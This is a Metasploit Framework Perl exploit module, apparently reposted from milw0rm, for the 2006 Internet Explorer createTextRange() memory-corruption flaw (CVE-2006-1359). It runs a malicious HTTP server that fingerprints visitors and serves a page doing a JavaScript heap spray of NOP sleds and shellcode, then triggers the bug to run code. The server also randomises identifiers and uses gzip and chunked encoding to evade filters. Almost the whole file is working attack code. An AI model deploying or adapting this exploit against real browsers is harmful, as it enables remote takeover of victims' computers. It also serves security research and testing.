##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_createtextrange;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
	'Gzip'       => [1, 'Enable gzip content encoding'],
	'Chunked'    => [1, 'Enable chunked transfer encoding'],
  };

my $info =
  {
	'Name'           => 'Internet Explorer createTextRange() Code Execution',
	'Version'        => '$Revision: 1.4 $',
	'Authors'        =>
	  [
		'Faithless <rhyskidd [at] gmail.com>',
		'Darkeagle <unl0ck.net>',
		'H D Moore <hdm [at] metasploit.com>',
		'<justfriends4n0w [at] yahoo.com>',
		'Anonymous',
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a code execution vulnerability in Microsoft Internet Explorer.
	Both IE6 and IE7 (Beta 2) are vulnerable. It will corrupt memory  in a way, which, under 
	certain circumstances, can lead to an invalid/corrupt table pointer dereference. EIP will point
	to a very remote, non-existent memory location. This module is the result of merging three
	different exploit submissions and has only been reliably tested against Windows XP SP2.
	This vulnerability was independently discovered by multiple parties. The heap spray method
	used by this exploit was pioneered by Skylined.
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  },

	'Payload'        =>
	  {
		'Space'    => 1024,
		'BadChars' => "\x00",
		'Keys'     => ['-bind'],
	  },
	'Refs'           =>
	  [
		['OSVDB', '24050'],
		['BID', '17196'],
		['CVE', '2006-1359'],
		['URL', 'http://secunia.com/secunia_research/2006-7/advisory/'],
		['URL', 'http://seclists.org/lists/bugtraq/2006/Mar/0410.html'],
		['URL', 'http://www.kb.cert.org/vuls/id/876678'],
		['URL', 'http://seclists.org/lists/fulldisclosure/2006/Mar/1439.html'],
		['URL', 'http://www.shog9.com/crashIE.html'],
	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'Internet Explorer 7 - (7.0.5229.0) -> 3C0474C2 (Windows XP SP2)' ],
		[ 'Internet Explorer 6 - (6.0.3790.0) -> 746F9468 (Windows XP SP2)' ],
	  ],

	'Keys'           => [ 'ie' ],

	'DisclosureDate' => 'Mar 19 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	
	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp'
	  );
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	my $httphost = ($self->GetVar('HTTPHOST') eq '0.0.0.0') ?
	  Pex::Utils::SourceIP('1.2.3.4') :
	  $self->GetVar('HTTPHOST');

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# Read the HTTP command
	my ($cmd, $url, $proto) = split(/ /, $fd->RecvLine(10), 3);
	my $agent;

	# Read in the HTTP headers
	while ((my $line = $fd->RecvLine(10))) {

		$line =~ s/^\s+|\s+$//g;

		my ($var, $val) = split(/\:/, $line, 2);

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		$agent = $val if $var =~ /User-Agent/i;
	}

	my $os = 'Unknown';

	$os = 'Linux'     if $agent =~ /Linux/i;
	$os = 'Mac OS X'  if $agent =~ /OS X/i;
	$os = 'Windows'   if $agent =~ /Windows/i;

	$self->PrintLine("[*] Client connected from $rhost:$rport ($os).");

	my $res = $fd->Send($self->BuildResponse($self->GenerateHTML()));

	$fd->Close();
}

sub JSUnescape {
	my $self = shift;
	my $data = shift;
	my $code = '';

	# Encode the shellcode via %u sequences for JS's unescape() function
	my $idx = 0;
	while ($idx < length($data) - 1) {
		my $c1 = ord(substr($data, $idx, 1));
		my $c2 = ord(substr($data, $idx+1, 1));
		$code .= sprintf('%%u%.2x%.2x', $c2, $c1);
		$idx += 2;
	}

	return $code;
}

sub GenerateHTML {
	my $self   = shift;
	my $target = $self->Targets->[$self->GetVar('TARGET')];

	my $shellcode    = $self->JSUnescape($self->GetVar('EncodedPayload')->Payload);
	my $nops         = $self->JSUnescape($self->MakeNops(4));
	my $rnd          = int(rand(3));
	my $inputtype    = (($rnd == 0) ? "checkbox" : (($rnd == 1) ? "radio" : "image"));
	my $inp          = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $tmp          = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $payload      = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $nopslide     = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $slidesize    = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $fillblock    = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $memblock     = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $heap         = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $index        = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $maxIndex     = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $fillHeap     = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $start        = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	my $timer        = "_".Pex::Text::AlphaNumText(int(rand(6)+3));
	$rnd             = int(rand(2));
	my $setTimeout   =($rnd == 0) ? "setTimeout('$fillHeap()', 5);" : "";
	my $setInterval  =($rnd == 1) ? "setInterval('$fillHeap()', 5);" : "";

	my $data  = qq#
<html>
<head>
	<script language="javascript">
    var $payload=unescape("$shellcode");

    var $nopslide=unescape("$nops");
    var $slidesize=20+$payload.length;
    while ($nopslide.length<$slidesize)
    {
        $nopslide+=$nopslide;
    }    

    var $fillblock=$nopslide.substring(0,$slidesize);
    var $memblock=$nopslide.substring(0,$nopslide.length-$slidesize);

    while($memblock.length+$slidesize<0x40000)
    {
        $memblock+=$fillblock;
    }    

    var $heap=new Array();
    var $index=0;
    var $maxIndex=2020;
    
    function $fillHeap() {
      $timer.innerHTML=Math.round(($index/$maxIndex)*100);
      if ($index<$maxIndex) {
        $heap.push($memblock+$payload);
        $index++;
        $setTimeout
      }
      else {
        $timer.innerHTML=100;
        $inp=document.createElement("input");
        $inp.type="$inputtype";
        $tmp=$inp.createTextRange();        
      }
    }   
    
    function $start() {
      $setTimeout$setInterval
    }
	</script>
</head>
<body onload="$start()">
Sit back and relax as your windows box is being exploited using a non CPU consuming heap spraying exploit.<BR />
In the meantime, you can open your task manager and watch how the VM size of IEXPLORE.EXE grows, while the CPU time of this process is very low.<BR />
Progress: <span id="$timer"></span>%
</body>
</html>
#;
}

sub BuildResponse {
	my ($self, $content) = @_;

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: text/html\r\n";

	if ($self->GetVar('Gzip')) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar('Chunked')) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}
1;

# milw0rm.com [2006-04-01]
